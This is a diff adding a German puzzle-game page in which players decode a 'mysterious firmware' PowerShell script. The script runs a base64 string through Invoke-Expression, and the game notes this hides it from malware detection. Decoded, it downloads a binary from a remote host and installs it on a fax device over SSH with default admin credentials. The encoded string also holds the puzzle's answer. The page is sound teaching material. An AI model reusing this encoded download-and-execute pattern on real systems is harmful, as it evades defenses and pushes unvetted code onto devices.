@@ -1,0 +1,128 @@
+<html>
+	<head>
+		<!-- Required meta tags -->
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+		<!-- Bootstrap CSS -->
+		<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+		<!-- Optional: Syntax highlighting for code -->
+		<link rel="stylesheet" href="https://unpkg.com/@highlightjs/cdn-assets@11.7.0/styles/github-dark.min.css">
+
+		
+		<!-- CustomCSS -->
+		<link rel="stylesheet" href="./css/custom_blue.css">
+		<link rel="stylesheet" href="./css/help.css">
+
+		<title>Mission (K)IMpossible</title>
+		
+		<style>
+			pre code {								
+				display: block;
+				white-space: pre-wrap; /* Forces line wrap */
+				word-break: break-all; /* Breaks long words */
+				overflow-wrap: break-word; /* Ensures long words break */
+			}
+		</style>
+	</head>
+	<body>		
+		<main class="container" role="main">
+			<nav class="navbar navbar-custom" >
+				<div>
+					<h6>Die Abenteuer von KIM & TIM</h6>
+					<h4>Kapt. II – To TI-Mfinity and Beyond</h4>					
+				</div>
+				
+				<img width="15%" src="./img/logo.svg"</img>								
+			</nav>
+		
+
+			<div class="container" >
+				<p><h3>Fax Vertrieb</h3></p>
+				<br>
+				<div class="card" >
+					<div class="card-header" style="text-align: center;">
+						<b>Die mysteriöse Firmware</b>
+					</div>
+					<h5 class="card-title" style="text-align: justify "></h5>
+
+					<div class="card-body" style="text-align: justify ">
+						<p>Die Faxgeräte wurden zu einem günstigen Preis von einem Distributor erworben. Der Verkäufer führte ein bereitgestelltes Skript zur automatischen Firmware-Aktualisierung aus, kurz bevor die mysteriöse Faxflut begann. </p>																		
+						<hr>						
+					</div>
+										
+					<div class="card-body" style="text-align: justify;">		
+						<p>Es könnte entscheidend sein, dieses Skript genauer unter die Lupe zu nehmen. Vielleicht ist der wahre Code hinter einer Schicht von Obfuskation verborgen und wartet darauf, entschlüsselt zu werden.</p>							
+						<div class="container mt-5">							
+							<pre><code class="language-powershell">
+$banner = @"
+┌┬┐┌─┐┌─┐┌┐┌┌┐ ┌─┐┌─┐┌─┐
+││││ ││ ││││├┴┐├─┤└─┐├┤ 
+┴ ┴└─┘└─┘┘└┘└─┘┴ ┴└─┘└─┘
+
+"@			
+
+Write-Host $banner
+
+$encoded = "IyBQYXJhbWV0ZXIgZvxyIFNlcnZlciB1bmQgWmllbGdlcuR0DQokc2VydmVyVXJsID0gImh0dHA6Ly8xMC4yMjMuMTIuMTIzL2Zpcm13YXJlLmJpbiIgICMgVVJMIGRlcyBGaXJtd2FyZS1Eb3dubG9hZHMNCiRmaXJtd2FyZVBhdGggPSAiJGVudjpURU1QXGZpcm13YXJlLmJpbiIgICAgICAgICAgIyBUZW1wb3LkcmVyIFNwZWljaGVyb3J0IGRlciBGaXJtd2FyZQ0KJGZheElwQWRkcmVzcyA9ICIxOTIuMTY4LjEuMTAwIiAgICAgICAgICAgICAgICAgICAjIElQLUFkcmVzc2UgZGVzIEZheGdlcuR0cyANCiRmYXhVc2VybmFtZSA9ICJhZG1pbiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBCZW51dHplcm5hbWUgZvxyIFNTSA0KJGZheFBhc3N3b3JkID0gInBhc3N3b3JkIiAgICAgICAgICAgICAgICAgICAgICAgICAjIFBhc3N3b3J0IGb8ciBTU0gNCiRmaXJtd2FyZURlc3RpbmF0aW9uID0gIi90bXAvZmlybXdhcmUuYmluIiAgICAgICAgIyBaaWVsb3J0IGF1ZiBkZW0gRmF4Z2Vy5HQNCg0KIyBTY2hyaXR0IDE6IEZpcm13YXJlLURhdGVpIGhlcnVudGVybGFkZW4NCldyaXRlLUhvc3QgIkxhZGUgRmlybXdhcmUtRGF0ZWkgaGVydW50ZXIuLi4iDQp0cnkgew0KICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHNlcnZlclVybCAtT3V0RmlsZSAkZmlybXdhcmVQYXRoIC1FcnJvckFjdGlvbiBTdG9wDQogICAgV3JpdGUtSG9zdCAiRmlybXdhcmUgZXJmb2xncmVpY2ggaGVydW50ZXJnZWxhZGVuOiAkZmlybXdhcmVQYXRoIg0KfSBjYXRjaCB7DQogICAgV3JpdGUtSG9zdCAiRmVobGVyIGJlaW0gSGVydW50ZXJsYWRlbiBkZXIgRmlybXdhcmUtRGF0ZWkuIg0KICAgIGV4aXQNCn0NCg0KIyBTY2hyaXR0IDI6IFZlcmJpbmR1bmcgenVtIEZheGdlcuR0IPxiZXIgU1NIIHVuZCDcYmVydHJhZ3VuZyBkZXIgRmlybXdhcmUNCldyaXRlLUhvc3QgIlN0ZWxsZSBWZXJiaW5kdW5nIHp1bSBGYXhnZXLkdCBoZXIgdW5kIPxiZXJ0cmFnZSBGaXJtd2FyZS4uLiINCnRyeSB7DQogICAgIyBTU0gtU2l0enVuZyBlaW5yaWNodGVuDQogICAgJHNlc3Npb24gPSBOZXctU1NIU2Vzc2lvbiAtQ29tcHV0ZXJOYW1lICRmYXhJcEFkZHJlc3MgLUNyZWRlbnRpYWwgKE5ldy1PYmplY3QgUFNDcmVkZW50aWFsICgkZmF4VXNlcm5hbWUsIChDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICRmYXhQYXNzd29yZCAtQXNQbGFpblRleHQgLUZvcmNlKSkpDQogICAgDQogICAgIyBGaXJtd2FyZS1EYXRlaSBhdWYgZGFzIEZheGdlcuR0IGhvY2hsYWRlbg0KICAgIFdyaXRlLUhvc3QgItxiZXJ0cmFnZSBEYXRlaSBhbjogJGZpcm13YXJlRGVzdGluYXRpb24iDQogICAgU2V0LVNDUEZpbGUgLUNvbXB1dGVyTmFtZSAkZmF4SXBBZGRyZXNzIC1DcmVkZW50aWFsICRzZXNzaW9uLkNyZWRlbnRpYWwgLUxvY2FsRmlsZSAkZmlybXdhcmVQYXRoIC1SZW1vdGVQYXRoICRmaXJtd2FyZURlc3RpbmF0aW9uDQogICAgDQogICAgIyBGaXJtd2FyZS1JbnN0YWxsYXRpb25zYmVmZWhsIGF1c2b8aHJlbiANCiAgICAkaW5zdGFsbENvbW1hbmQgPSAic3VkbyAvdXNyL2xvY2FsL2Jpbi9pbnN0YWxsX2Zpcm13YXJlICRmaXJtd2FyZURlc3RpbmF0aW9uIC12IDAuOS4xLjQiDQogICAgSW52b2tlLVNTSENvbW1hbmQgLVNlc3Npb25JZCAkc2Vzc2lvbi5TZXNzaW9uSWQgLUNvbW1hbmQgJGluc3RhbGxDb21tYW5kDQogICAgDQogICAgV3JpdGUtSG9zdCAiRmlybXdhcmUgMC45LjEuNCBlcmZvbGdyZWljaCD8YmVydHJhZ2VuIHVuZCBJbnN0YWxsYXRpb25zYmVmZWhsIGF1c2dlZvxocnQuIg0KICAgIA0KICAgICMgU1NILVNpdHp1bmcgYmVlbmRlbg0KICAgIFJlbW92ZS1TU0hTZXNzaW9uIC1TZXNzaW9uSWQgJHNlc3Npb24uU2Vzc2lvbklkDQp9IGNhdGNoIHsNCiAgICBXcml0ZS1Ib3N0ICJGZWhsZXIgYmVpIGRlciBWZXJiaW5kdW5nIHp1bSBGYXhnZXLkdCBvZGVyIERhdGVp/GJlcnRyYWd1bmcuIg0KfQ0KDQojIEJlcmVpbmlndW5nDQpXcml0ZS1Ib3N0ICJM9nNjaGUgdGVtcG9y5HJlIEZpcm13YXJlLURhdGVpLi4uIg0KdHJ5IHsNCiAgICBSZW1vdmUtSXRlbSAtUGF0aCAkZmlybXdhcmVQYXRoIC1Gb3JjZQ0KICAgIFdyaXRlLUhvc3QgIlRlbXBvcuRyZSBEYXRlaSBlcmZvbGdyZWljaCBnZWz2c2NodC4iDQp9IGNhdGNoIHsNCiAgICBXcml0ZS1Ib3N0ICJGZWhsZXIgYmVpbSBM9nNjaGVuIGRlciB0ZW1wb3LkcmVuIERhdGVpLiINCn0NCg0KV3JpdGUtSG9zdCAiU2tyaXB0IGFiZ2VzY2hsb3NzZW4uIg=="
+
+$script = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
+Invoke-Expression $script
+							</code></pre></div>
+							<hr>
+						</div>
+					
+					
+						
+						
+							
+					
+					<div id="info_text" style="display: block;">
+						<div class="col-md-12" style="align-items: center; justify-content: center; display:flex; text-align: center;">							
+							<img width="6%" src="./img/tim_head.png" style="padding-right: 10px;" draggable="false"  oncontextmenu="return false;"></img>		
+							<div class="border p-3 rounded " style="border: 1px dashed #1C1A54!important;">							
+								<p id="info_text_field" class="bottom_text" style="padding-left: 30px; padding-right: 30px;">Offenbar wird ein codierter String ausgeführt, wodurch er vom Systemschutz nicht als Malware erkannt wird. Wir benötigen die installierte Firmware Version für den HiFi Laden hinter der Brücke.</p>
+							</div>
+							<img width="6%" src="./img/tim_head.png" style="padding-left: 10px;" draggable="false" oncontextmenu="return false;"></img>		
+						</div>
+						<br>
+					</div>
+				</div>
+				<br>
+
+			</div>
+		</main>
+
+		<!-- Hilfe-Button -->
+		<button id="helpButton">
+			<img src="./img/help.svg" alt="Hilfe" />
+		</button>
+
+		<!-- Eingebettetes Hilfefenster -->
+		<div id="helpOverlay">
+			<button class="close-btn">&times;</button>
+			<img src="./img/help.png" alt="Hilfegrafik">
+			<p></p>
+			<p class="text-justify">Du solltest den Code prüfen und entschlüsseln.</p>
+		</div>
+
+
+		
+		 <!-- Bootstrap JS and dependencies -->
+		 <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+		 <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
+		 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+		 <!-- Include highlight.js -->
+		 <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+		 <!-- Include PowerShell language -->
+		 <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>		
+		 <script src="./js/help.js"></script>
+		 <script>hljs.highlightAll();</script>
+	 </body>
+			
+		
+		<script>	
+			
+		</script>
+	</body>
+</html>
